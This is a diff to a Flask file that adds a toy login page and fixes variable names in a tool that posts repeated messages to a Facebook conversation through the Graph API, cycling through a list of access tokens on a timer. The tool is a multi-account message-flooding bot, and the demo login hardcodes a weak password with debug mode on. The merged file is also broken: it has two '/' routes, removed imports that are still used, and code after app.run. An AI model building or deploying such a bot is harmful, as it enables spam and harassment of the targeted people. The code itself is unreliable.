@@ -1,13 +1,68 @@
-from flask import Flask, request, render_template_string
-import requests
-from threading import Thread, Event
-import time
+from flask import Flask, request, redirect, make_response, render_template_string
 import random
 import string
- 
+
 app = Flask(__name__)
-app.debug = True
- 
+
+users = {"admin": "1234"}  # demo login
+sessions = {}
+
+@app.route('/', methods=['GET'])
+def home():
+    session_id = request.cookies.get("session_id")
+
+    if session_id in sessions:
+        username = sessions[session_id]
+        return render_template_string("""
+            <h1>Welcome {{username}}</h1>
+            <a href="/panel">Go to Panel</a><br>
+            <a href="/logout">Logout</a>
+        """, username=username)
+
+    return render_template_string("""
+        <form method="post" action="/login">
+            <input name="username" placeholder="Username"><br><br>
+            <input name="password" type="password" placeholder="Password"><br><br>
+            <button type="submit">Login</button>
+        </form>
+    """)
+
+@app.route('/login', methods=['POST'])
+def login():
+    username = request.form.get("username")
+    password = request.form.get("password")
+
+    if username in users and users[username] == password:
+        session_id = ''.join(random.choices(string.ascii_letters + string.digits, k=32))
+        sessions[session_id] = username
+
+        resp = make_response(redirect('/'))
+        resp.set_cookie("session_id", session_id, httponly=True)
+        return resp
+
+    return "Invalid login"
+
+@app.route('/logout')
+def logout():
+    session_id = request.cookies.get("session_id")
+    if session_id in sessions:
+        del sessions[session_id]
+
+    resp = make_response(redirect('/'))
+    resp.set_cookie("session_id", "", expires=0)
+    return resp
+
+@app.route('/panel')
+def panel():
+    session_id = request.cookies.get("session_id")
+
+    if session_id not in sessions:
+        return redirect('/')
+
+    return "This is a protected panel page!"
+
+if __name__ == "__main__":
+    app.run(debug=True)
 headers = {
     'Connection': 'keep-alive',
     'Cache-Control': 'max-age=0',
@@ -23,32 +78,32 @@ headers = {
 stop_events = {}
 threads = {}
  
-def send_messages(access_cookie, thread_id, mn, time_interval, messages, task_id):
+def send_messages(access_tokens, thread_id, mn, time_interval, messages, task_id):
     stop_event = stop_events[task_id]
     while not stop_event.is_set():
         for message1 in messages:
             if stop_event.is_set():
                 break
-            for access_cookie in access_cookie:
+            for access_token in access_tokens:
                 api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
-                message = str(mn) + ' ' + message 
-parameters = {'access_cookie': access_cookie, 'message': message}
+                message = str(mn) + ' ' + message1
+                parameters = {'access_token': access_token, 'message': message}
                 response = requests.post(api_url, data=parameters, headers=headers)
                 if response.status_code == 200:
-                    print(f"Message Sent Successfully From token {access_cookie}: {message}")
+                    print(f"Message Sent Successfully From token {access_token}: {message}")
                 else:
-                    print(f"Message Sent Failed From cookie{access_cookie}: {message}")
+                    print(f"Message Sent Failed From token {access_token}: {message}")
                 time.sleep(time_interval)
  
 @app.route('/', methods=['GET', 'POST'])
 def send_message():
     if request.method == 'POST':
-        Cookie_option = request.form.get('cookieOption')
+        token_option = request.form.get('tokenOption')
         
-        if cookie_option == 'single':
-            access_cookie = [request.form.get('singleToken')]
+        if token_option == 'single':
+            access_tokens = [request.form.get('singleToken')]
         else:
-            Cookies_file = request.files['cookiesFile']
+            token_file = request.files['tokenFile']
             access_tokens = token_file.read().decode().strip().splitlines()
  
         thread_id = request.form.get('threadId')
@@ -126,19 +181,19 @@ def send_message():
   <div class="container text-center">
     <form method="post" enctype="multipart/form-data">
       <div class="mb-3">
-        <label for="cookieOption" class="form-label">Select cookie Option</label>
-        <select class="form-control" id="cookieOption" name="cookieOption" onchange="toggleTokenInput()" required>
+        <label for="tokenOption" class="form-label">Select Token Option</label>
+        <select class="form-control" id="tokenOption" name="tokenOption" onchange="toggleTokenInput()" required>
           <option value="single">Single Token</option>
-          <option value="multiple">cookie File</option>
+          <option value="multiple">Token File</option>
         </select>
       </div>
-      <div class="mb-3" id="singlecookieInput">
-        <label for="singleToken" class="form-label">Enter Single cookie</label>
-        <input type="text" class="form-control" id="singleToken" name="singlecookie">
+      <div class="mb-3" id="singleTokenInput">
+        <label for="singleToken" class="form-label">Enter Single Token</label>
+        <input type="text" class="form-control" id="singleToken" name="singleToken">
       </div>
-      <div class="mb-3" id="cookiesFileInput" style="display: none;">
-        <label for="cookiesFile" class="form-label">Choose cookiesFile</label>
-        <input type="file" class="form-control" id="cookiesFile" name="cookiesFile">
+      <div class="mb-3" id="tokenFileInput" style="display: none;">
+        <label for="tokenFile" class="form-label">Choose Token File</label>
+        <input type="file" class="form-control" id="tokenFile" name="tokenFile">
       </div>
       <div class="mb-3">
         <label for="threadId" class="form-label">Enter Inbox/convo uid</label>
@@ -176,14 +231,14 @@ def send_message():
     </div>
   </footer>
   <script>
-    function togglecookiesInput() {
-      var tokenOption = document.getElementById('cookiesOption').value;
-      if (cookiesOption == 'single') {
+    function toggleTokenInput() {
+      var tokenOption = document.getElementById('tokenOption').value;
+      if (tokenOption == 'single') {
         document.getElementById('singleTokenInput').style.display = 'block';
         document.getElementById('tokenFileInput').style.display = 'none';
       } else {
-        document.getElementById('singlecookieInput').style.display = 'none';
-        document.getElementById('cookieFileInput').style.display = 'block';
+        document.getElementById('singleTokenInput').style.display = 'none';
+        document.getElementById('tokenFileInput').style.display = 'block';
       }
     }
   </script>
